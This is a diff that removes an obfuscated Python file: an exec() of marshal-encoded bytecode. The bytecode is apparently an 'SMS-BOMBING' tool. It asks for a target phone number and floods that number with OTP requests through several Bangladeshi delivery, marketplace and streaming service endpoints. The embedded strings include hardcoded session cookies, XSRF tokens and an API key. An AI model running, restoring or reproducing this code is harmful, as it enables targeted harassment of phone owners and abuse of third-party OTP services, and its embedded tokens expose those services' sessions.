@@ -1,2 +1,415 @@
-import marshal
-exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\xf3H\x0c\x00\x00\x95\x00S\x00S\x01K\x00r\x00S\x00S\x01K\x01r\x01S\x00S\x01K\x02r\x02S\x00S\x01K\x03r\x03\\\x03R\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\x00S\x025\x01\x00\x00\x00\x00\x00\x00 \x00\\\x02R\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\x00S\x035\x01\x00\x00\x00\x00\x00\x00 \x00\\\x06"\x00S\x045\x01\x00\x00\x00\x00\x00\x00 \x00\\\x07"\x00S\x055\x01\x00\x00\x00\x00\x00\x00r\x08\\\t"\x00\\\x085\x01\x00\x00\x00\x00\x00\x00S\x06:X\x00\x00a,\x00\x00\\\x08R\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x005\x00\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00a\x17\x00\x00\\\x08R\x17\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x075\x01\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00a\x01\x00\x00O\x19\\\x06"\x00S\x085\x01\x00\x00\x00\x00\x00\x00 \x00\\\x01R\x18\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\x005\x00\x00\x00\x00\x00\x00\x00 \x00\\\x07"\x00S\t5\x01\x00\x00\x00\x00\x00\x00r\r\\\rR\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x005\x00\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00d\x19\x00\x00\\\x06"\x00S\n5\x01\x00\x00\x00\x00\x00\x00 \x00\\\x01R\x18\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\x005\x00\x00\x00\x00\x00\x00\x00 \x00\\\x0e"\x00\\\r5\x01\x00\x00\x00\x00\x00\x00r\x0f\\\x0fS\x0b:\x12\x00\x00d\x06\x00\x00\\\x0fS\x0c:\x94\x00\x00a\x19\x00\x00\\\x06"\x00S\r5\x01\x00\x00\x00\x00\x00\x00 \x00\\\x01R\x18\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\x005\x00\x00\x00\x00\x00\x00\x00 \x00\\\x03R\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\x00S\x025\x01\x00\x00\x00\x00\x00\x00 \x00S\x0er\x10\\\x10\x13\x00HJ\x00\x00r\x11\\\x01R$\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00R\'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\\\x115\x01\x00\x00\x00\x00\x00\x00 \x00\\\x01R$\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00R)\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x005\x00\x00\x00\x00\x00\x00\x00 \x00\\\x02R\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\x00S\x0f5\x01\x00\x00\x00\x00\x00\x00 \x00ML\x00\x00\x0b\x00 \x00\\\x06"\x00S\x105\x01\x00\x00\x00\x00\x00\x00 \x00\\\x02R\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\x00S\x115\x01\x00\x00\x00\x00\x00\x00 \x00S\x00r\x15\\\x15\\\x0f:\x12\x00\x00G\x04aQ\x00\x00\\\x00R,\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\x00S\x12\\\x08\x0e\x003\x025\x01\x00\x00\x00\x00\x00\x00r\x10\\\x10R.\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x13:X\x00\x00a$\x00\x00\\\x15S\x0b-\r\x00\x00r\x15\\\x06"\x00S\x14\\\x15\x0e\x00S\x153\x035\x01\x00\x00\x00\x00\x00\x00 \x00\\\x02R\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\x00S\x0b5\x01\x00\x00\x00\x00\x00\x00 \x00O\x01\x1e\x00\\\x00R,\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\x00S\x16\\\x08\x0e\x003\x025\x01\x00\x00\x00\x00\x00\x00r\x18\\\x18R.\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x13:X\x00\x00a$\x00\x00\\\x15S\x0b-\r\x00\x00r\x15\\\x06"\x00S\x14\\\x15\x0e\x00S\x153\x035\x01\x00\x00\x00\x00\x00\x00 \x00\\\x02R\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\x00S\x0b5\x01\x00\x00\x00\x00\x00\x00 \x00O\x01\x1e\x00S\x17S\x18S\x19S\x1aS\x1bS\x1cS\x1dS\x1eS\x1fS S!S"S#.\x0cr\x19S$\\\x080\x01r\x1a\\\x00R,\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\x00S%\\\x1a\\\x19S&9\x03r\x1b\\\x1bR.\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x13:X\x00\x00a$\x00\x00\\\x15S\x0b-\r\x00\x00r\x15\\\x06"\x00S\x14\\\x15\x0e\x00S\x153\x035\x01\x00\x00\x00\x00\x00\x00 \x00\\\x02R\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\x00S\x0b5\x01\x00\x00\x00\x00\x00\x00 \x00O\x01\x1e\x000\x00S\'S(_\x01S)S*_\x01S+S,_\x01S-S._\x01S/S0_\x01S1S2_\x01S3S4_\x01S5S6_\x01S7S8_\x01S9S:_\x01S;S<_\x01S=S>_\x01S?S@_\x01SASB_\x01SCSD_\x01SESF_\x01SGSH_\x01r\x1c0\x00SISJ_\x01SKSL_\x01SMS\x18_\x01SNSO_\x01SPSQ_\x01SRSS_\x01STSU_\x01SVS _\x01SWS!_\x01SXS"_\x01SYSZ_\x01S[S\\_\x01S]S^_\x01S_S!_\x01S`S._\x01SaS\x1f_\x01r\x19SbScSd\\\x08Se.\x04r\x1d\\\x00R<\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\x00Sf\\\x1c\\\x19\\\x1dSg9\x04r\x1f\\\x1fR.\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x13:X\x00\x00a$\x00\x00\\\x15S\x0b-\r\x00\x00r\x15\\\x06"\x00S\x14\\\x15\x0e\x00S\x153\x035\x01\x00\x00\x00\x00\x00\x00 \x00\\\x02R\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\x00S\x0b5\x01\x00\x00\x00\x00\x00\x00 \x00O\x01\x1e\x00S\x17S\x18S\x19ShSiSjS\x1cS\x1dSkS\x1fSlS S!S"SmSn.\x0fr\x19\\\x08SoS\x01Sp.\x03r \\\x00R<\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\x00Sq\\\x19\\ Sr9\x03r!\\!R.\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x13:X\x00\x00a$\x00\x00\\\x15S\x0b-\r\x00\x00r\x15\\\x06"\x00S\x14\\\x15\x0e\x00S\x153\x035\x01\x00\x00\x00\x00\x00\x00 \x00\\\x02R\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\x00S\x0b5\x01\x00\x00\x00\x00\x00\x00 \x00O\x01\x1e\x00SsStSuSvSwSx.\x05r\x1cSySzS\x18S{S|S}S S!S"S\x1cS\x1dS\x1eS\x1fS~.\rr\x19S\x7f\\\x080\x01r \\\x00R<\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\x00S\x80\\\x1c\\\x19\\ S\x819\x04r"\\"R.\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x13:X\x00\x00a$\x00\x00\\\x15S\x0b-\r\x00\x00r\x15\\\x06"\x00S\x14\\\x15\x0e\x00S\x153\x035\x01\x00\x00\x00\x00\x00\x00 \x00\\\x02R\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\x00S\x0b5\x01\x00\x00\x00\x00\x00\x00 \x00O\x01\x1e\x00\\\x08R\x17\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00So5\x01\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00d\x05\x00\x00So\\\x08-\x00\x00\x00r\x08S\x82S\x17S\x18S{S\x83S\x84S S!S"S\x1cS\x1dSkS\x1fS~.\rr\x19S\x7f\\\x080\x01r \\\x00R<\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\x00S\x85\\\x19\\ Sr9\x03r#\\#R.\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x13:X\x00\x00a$\x00\x00\\\x15S\x0b-\r\x00\x00r\x15\\\x06"\x00S\x14\\\x15\x0e\x00S\x153\x035\x01\x00\x00\x00\x00\x00\x00 \x00\\\x02R\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\x00S\x0b5\x01\x00\x00\x00\x00\x00\x00 \x00O\x01\x1e\x00S\x86S\x86S\x87.\x02r\x1cS\x88SzS\x18S{S\x89S\x8aS S!S"S\x1cS\x1dS\x1eS\x1fS\x8bS\x8c.\x0er\x19S\x8d\\\x08S\x8eS\x8f.\x03r \\\x00R<\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\x00S\x90\\\x1c\\\x19\\ S\x819\x04r$\\$R.\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x13:X\x00\x00a$\x00\x00\\\x15S\x0b-\r\x00\x00r\x15\\\x06"\x00S\x14\\\x15\x0e\x00S\x153\x035\x01\x00\x00\x00\x00\x00\x00 \x00\\\x02R\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\x00S\x0b5\x01\x00\x00\x00\x00\x00\x00 \x00O\x01\x1e\x00\\\x08R\x17\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00So5\x01\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00d7\x00\x00So\\\x08-\x00\x00\x00r\x080\x00S\x91S\x92_\x01S\x93S\x94_\x01S\x95S\x96_\x01S)S\x97_\x01S\x98S\x99_\x01S\x9aS._\x01S\x9bS._\x01S1S\x9c_\x01S\x9dS\x9e_\x01S\x9fS\xa0_\x01S\xa1S\xa2_\x01S\xa3S\xa4_\x01S\xa5S\xa6_\x01S+S\xa7_\x01S\xa8S\xa9_\x01S\xaaS\xab_\x01r\x1cS\xacS\x17S\x18S\xadS\xaeS S!S"S\x1cS\x1dS^S\x1fSlS\xaf.\rr\x19\\\x08S\xb0S\xb1.\x02r\x1a\\\x00R<\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\x00S\xb2\\\x1a\\\x1c\\\x19S\xb39\x04r\x11\\\x11R.\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x13:X\x00\x00a$\x00\x00\\\x15S\x0b-\r\x00\x00r\x15\\\x06"\x00S\x14\\\x15\x0e\x00S\x153\x035\x01\x00\x00\x00\x00\x00\x00 \x00\\\x02R\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\x00S\x0b5\x01\x00\x00\x00\x00\x00\x00 \x00O\x01\x1e\x00S\xb4S\xb5S\x18S{S\xb6S\xb7S S!S"S\x1cS\x1dS\x1eS\x1fS~.\rr\x19\\\x08S\x03S\x01S\xb8.\x03r \\\x00R<\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\x00S\xb9\\\x19\\ Sr9\x03r%\\%R.\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x13:X\x00\x00a$\x00\x00\\\x15S\x0b-\r\x00\x00r\x15\\\x06"\x00S\x14\\\x15\x0e\x00S\x153\x035\x01\x00\x00\x00\x00\x00\x00 \x00\\\x02R\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\x00S\x0b5\x01\x00\x00\x00\x00\x00\x00 \x00O\x01\x1e\x00\\\x15\\\x0f:\x12\x00\x00a\x03\x00\x00G\x04MQ\x00\x00S\xbar\x18\\\x18\x13\x00HJ\x00\x00r\x11\\\x01R$\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00R\'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\\\x115\x01\x00\x00\x00\x00\x00\x00 \x00\\\x01R$\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00R)\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x005\x00\x00\x00\x00\x00\x00\x00 \x00\\\x02R\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\x00S\x0f5\x01\x00\x00\x00\x00\x00\x00 \x00ML\x00\x00\x0b\x00 \x00g\x01)\xbb\xe9\x00\x00\x00\x00N\xda\x05clear\xe9\x02\x00\x00\x00uf\x05\x00\x00\x1b[1;32m\n\n\n\n  ___ __  __ ___     ___  ___  __  __ ___ ___ _  _  ___ \n / __|  \\/  / __|___| _ )/ _ \\|  \\/  | _ |_ _| \\| |/ __|\n \\__ | |\\/| \\__ |___| _ | (_) | |\\/| | _ \\| || .` | (_ |\n |___|_|  |_|___/   |___/\\___/|_|  |_|___|___|_|\\_|\\___|\n                                      \n\n\t\t\x1b[1;33m\xe2\x9a\xa0\xef\xb8\x8f Warning!\n\x1b[1;31mThis tool is only made for Educational Purpose. Misuse of this tool can be trigger the Cyber System. We do not support any type of Hacking or Phishing and the developer will not responsible for any misuse of this tool. Stay in Ethic. \xe2\x9c\x85\x1b[0m"                                                                                                                                                   \x1b[1;36m\n\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\n\x1b[1;34mTools Author: \x1b[1;33mMohammad Rayhan Khan\n\x1b[1;34mVersion: \x1b[1;33m1.0\n\x1b[1;34mTool Name: \x1b[1;33mSMS-BOMBING\n\x1b[1;34mGithub: \x1b[1;33mhttps://github.com/lucifer-fernandez/SMS-BOMB.git\n\x1b[1;36m\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\nz%\x1b[1;36mEnter your Target Number:\x1b[0m \xe9\x0b\x00\x00\x00\xda\x0201u\x1e\x00\x00\x00\x1b[1;31m\xe2\x9d\x8c Invalid Number!\x1b[0mz2\x1b[1;36mEnter your SMS amount between (1-100):\x1b[0m u\x1d\x00\x00\x00\x1b[1;31m\xe2\x9d\x8c Invalid input!\x1b[0m\xe9\x01\x00\x00\x00\xe9d\x00\x00\x00u9\x00\x00\x00\x1b[1;31m\xe2\x9d\x8c Invalid amount! Must be between 1 and 100.\x1b[0mu)\x00\x00\x00\n\n\n\t\t\x1b[1;33m\xf0\x9f\x92\xa3 Bombing Started...!\x1b[0m\ng\n\xd7\xa3p=\n\xb7?z1\n\t\x1b[1;34mPress Control+Z for stop Bombing.\x1b[0m\n\n\n\xe9\x03\x00\x00\x00z.https://apibeta.iqra-live.com/api/v2/sent-otp/\xe9\xc8\x00\x00\x00u\x0b\x00\x00\x00\x1b[1;32m\xe2\x9c\x85 z\x1b sms sent successfully.\x1b[0mzKhttps://bikroy.com/data/phone_number_login/verifications/phone_login?phone=z\x03*/*z\x0een-US,en;q=0.9z\nkeep-alivez\x17https://ecourier.com.bdz\x18https://ecourier.com.bd/\xda\x05empty\xda\x04corsz\tsame-sitezoMozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36z("Chromium";v="137", "Not/A)Brand";v="24"z\x02?1z\t"Android")\x0c\xda\x06Accept\xfa\x0fAccept-Language\xda\nConnection\xda\x06Origin\xda\x07Referer\xfa\x0eSec-Fetch-Dest\xfa\x0eSec-Fetch-Mode\xfa\x0eSec-Fetch-Site\xfa\nUser-Agent\xfa\tsec-ch-ua\xfa\x10sec-ch-ua-mobile\xfa\x12sec-ch-ua-platform\xda\x06mobilez>https://backoffice.ecourier.com.bd/api/web/individual-send-otp)\x02\xda\x06params\xda\x07headers\xda\x07_gcl_gsz\x1c2.1.k5$i1754139607$u36406433\xda\x07_gcl_auz\x191.1.1053490129.1754139612\xda\x03_gaz\x1aGA1.1.466660647.1754139613\xda\x11_tt_enable_cookie\xda\x011\xda\x04_ttpz 01K1NDWPS08RH3HK16SGCV6Z4H_.tt.1\xda\x04_fbpz%fb.1.1754139614479.845709771715957314\xda\x1bttcsid_COSTTJJC77U1Q2BAH980z31754146481721::XjilHizjYwtDZqJQRnCN.2.1754146482284\xda\x1bttcsid_CPEM4I3C77UBKGA90VN0z31754146481738::lJsEmhO1EvOc0xcThKjo.2.1754146482286\xda\x1bttcsid_CTR76TRC77U1GH2BI2V0z31754146481746::dN_FtsdpMVyvBNdlsD9Y.2.1754146482288\xda\x0e_ga_J177DW73V3z-GS2.1.s1754146480$o2$g0$t1754146485$j55$l0$h0\xda\x07_gcl_awzFGCL.1754146488.EAIaIQobChMI2deH05bsjgMV6TZUCR2aOyhpEAEYASAAEgI-5vD_BwEz\nXSRF-TOKENaV\x01\x00\x00eyJpdiI6ImpBNElEVy81VWdOV2J6SnJmRk83cXc9PSIsInZhbHVlIjoiaEd0NmZCNDdXVkt3OE1XRS9EdDkyV1liYWo0SXRzSDRPUjVxcXl5MjV6SklBYnBvWUU5dU81TlpFUVViN0VSRVh4R0ZDU2p1aDRFZjhublhNMVc3cWJLWmdldU9ML2xCa295aEFwU1pUaW9ROFc2b0s4bi9GSlFseHJsancwWnUiLCJtYWMiOiI2MDA1YTcwNWFmNTk2YTc4MDUyZWM4YWY4ZTgzYTJmM2YwMmJjMzcxM2EzMWU3MDZhODFmODU3MWNkMzMwZDMwIiwidGFnIjoiIn0%3D\xda\x0equizbd_sessionaV\x01\x00\x00eyJpdiI6InozNGRDem9QSkp0Q2N0RmN1OWpNS2c9PSIsInZhbHVlIjoiMVpNdllmTDVyMGZ0S2NLRzVtSGIwcHRIMnVZUU9kTDVnb0FUaE9hd3JlbFdOMGwvYnFxQkVCOGJoLzRkbWVWcXhpZTY5MXVjMk85VllWcE9Ib29sMzBONjVPajhUWXZNZEJtT3hwQ2VwS1lUNjlrRnBGT0ljRmd4aDUzeGZZMEYiLCJtYWMiOiJlM2M2MTE4NjE4Mzk4YWYwNjYwZTllNzg4YTQ4ODg5ZDE5OWYxNDBjMWJmNGEyNDRmZjY1YTY4NDJlZjE5NGIyIiwidGFnIjoiIn0%3D\xda\x06ttcsidz31754146481727::Jugp3IwwV0l78ZAKMrVb.2.1754146501483\xda\x1bttcsid_CPK02KJC77U57258L9A0z31754146487606::2ePqBt0LuVMUVkZim0Lf.2.1754146501750\xda\x1bttcsid_CR7CT4RC77U5L7EOR4FGz31754146487613::5Mz94VWbRcYyp-k5VzIN.2.1754146501751\xda\x0e_ga_4CKNNTBZW6z-GS2.1.s1754146487$o2$g0$t1754146502$j45$l0$h0\xda\tauthorityz\x0epay.quizbd.app\xda\x06acceptz\x87text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\xfa\x0faccept-languagez\rcache-controlz\tmax-age=0\xfa\x0ccontent-typez!application/x-www-form-urlencoded\xda\x06originz\x16https://pay.quizbd.app\xda\x07refererz\x8ahttps://pay.quizbd.app/buy-pack/1025?gad_source=5&gad_campaignid=22843081087&gclid=EAIaIQobChMI2deH05bsjgMV6TZUCR2aOyhpEAEYASAAEgI-5vD_BwEr\x16\x00\x00\x00r\x17\x00\x00\x00r\x18\x00\x00\x00\xfa\x0esec-fetch-dest\xda\x08document\xfa\x0esec-fetch-mode\xda\x08navigate\xfa\x0esec-fetch-sitez\x0bsame-originz\x0esec-fetch-userz\x19upgrade-insecure-requests\xfa\nuser-agent\xda(4kyvvDVDl6zsTWiuKREy4orb6OyofyV7RHF4m7ik\xda\x041025\xda\x00)\x04\xda\x06_token\xda\x08bundleId\xda\x08campaign\xda\nuserNumberz\x1fhttps://pay.quizbd.app/send-otp)\x03\xda\x07cookiesr\x1b\x00\x00\x00\xda\x04dataz\x1fapplication/json; charset=utf-8z\x1bhttps://app.quizgiri.com.bdz\x1chttps://app.quizgiri.com.bd/z\ncross-site\xda\x0eXMLHttpRequest\xda gYsiNSVBDuCt8yMUXpF06iQ1eDrMGv6G)\x0fr\r\x00\x00\x00r\x0e\x00\x00\x00r\x0f\x00\x00\x00z\x0cContent-typer\x10\x00\x00\x00r\x11\x00\x00\x00r\x12\x00\x00\x00r\x13\x00\x00\x00r\x14\x00\x00\x00r\x15\x00\x00\x00z\x10X-Requested-Withr\x16\x00\x00\x00r\x17\x00\x00\x00r\x18\x00\x00\x00z\tx-api-keyz\x03+88)\x03\xda\x05phone\xda\x0ccountry_code\xda\tfcm_tokenz0https://developer.quizgiri.xyz/api/v2.0/send-otp)\x02r\x1b\x00\x00\x00\xda\x04jsonz\x1bGA1.1.1007807516.1754153780z%fb.2.1754153780093.834494875177130484z\x191.1.1444896708.1754153781z-GS2.1.s1754153781$o1$g1$t1754153826$j15$l0$h0z-GS2.1.s1754153779$o1$g1$t1754153829$j10$l0$h0)\x05r\x1e\x00\x00\x00r"\x00\x00\x00r\x1d\x00\x00\x00\xda\x0e_ga_ZTN98XM7BX\xda\x0e_ga_DVN5RVT5NYz\x0fapi.redx.com.bdz!application/json, text/plain, */*z\x10application/jsonz\x13https://redx.com.bdz\x14https://redx.com.bd/)\rr-\x00\x00\x00r.\x00\x00\x00r/\x00\x00\x00r0\x00\x00\x00r1\x00\x00\x00r2\x00\x00\x00r\x16\x00\x00\x00r\x17\x00\x00\x00r\x18\x00\x00\x00r3\x00\x00\x00r5\x00\x00\x00r7\x00\x00\x00r8\x00\x00\x00\xda\x0bphoneNumberzJhttps://api.redx.com.bd/v1/merchant/registration/generate-registration-otp)\x03r@\x00\x00\x00r\x1b\x00\x00\x00rG\x00\x00\x00z\x14prod-api.hoichoi.devz\x16https://www.hoichoi.tvz\x17https://www.hoichoi.tv/zBhttps://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code/resendz\xc0LXD99btGj0/Y8fb2bl2yfIgbirrJTcuxqwj6jW7G3nkcvY3ODRtuB7iig6opXP/bx1cjMWHF2g+h/AHTUNo2fMjWDQ+8Shqgm4G2hPk4yu+oYgJT5wGrAmyoZopjMiVt4qIrhk41Ws2Ru3VvVxfcesOi8isYWcPz/EcO1XKc27uUXKy4v36AZfzBCpJSVQ==)\x02\xda\x06AWSALB\xda\nAWSALBCORSz\x0cgw.jotno.netz\x15https://www.jotno.netz\x16https://www.jotno.net/\xda\x03web)\x0er-\x00\x00\x00r.\x00\x00\x00r/\x00\x00\x00r0\x00\x00\x00r1\x00\x00\x00r2\x00\x00\x00r\x16\x00\x00\x00r\x17\x00\x00\x00r\x18\x00\x00\x00r3\x00\x00\x00r5\x00\x00\x00r7\x00\x00\x00r8\x00\x00\x00z\x10x-request-source\xda\x08CONSUMERa\x8e\x08\x00\x0003AFcWeA7Vom9T6jToVPVSUp5LUyT5bDVd69tCAkRci5v3XU5q976aCaOXQn9M4LnhlLl6bu4oJJ-VgkVZIyYrdA3UFBiPikH-QGX7TUwmLgOTdB8v82vZCZ2LcVVFgpV7wIaShN6ISYKJbcb5IFIbcohjKln1nQI1dq9rQ_CzWmh8qrfWkJ3ugBeaLIwVjNlNwleYh6PpE2UY9Tj-b80sQgVVRYlfkLGXRi1mKe3GCk-0K-xgwf3Ob6_M3OhC3phIeKrsOjTJJWtB1MEo7eOiVNJAjccJ80aIhZCCavGZRZzqik1i59_J1u_9b6kAO9XFGo6ch0koAa5nXgbJqWwxoxbL_q1-HRkDtFBEWRSymekee6vYOXlUt_NGRSRQQRo_0LNY1J_02N2_ur2nBzHmgnVJImUs-fKrfLJ6g4aMYtpjK1AFIxzU1KwZiuNMh4C2Mb5R3ORE_1eDMfHFTPLEdUglK34aC8_ggpvulvwigJiVZD-brIyESd_aFn9z1K79PTbHhWZrQKuDnhKNWl1qfb7Ns9HDXoT_7R1YHl6syEjpQ758nEWr8LQ8kmsfKm-xGVRAO7QHLnm5EpUXzDecXF7I6WZsax5qLemLWggwje4oztakL52nKWhyDRXbmWWfDWANXC67O5nq0EyJ0ssuk_Mo14qI4ESqoHe0ieJIJIbYl-wkheERo6jccvYW_DhM8ZfMjVPSb3KI8Ui5TczbuRme5SAeqSJQ5SPPsyJz2gJhYXXQUasrglQLC6qQHcLmQc1ZAdeGl_VSm-lPHmt-L9cDj6A4UhPdqOj1Xa0Pv5yQdJeaFHd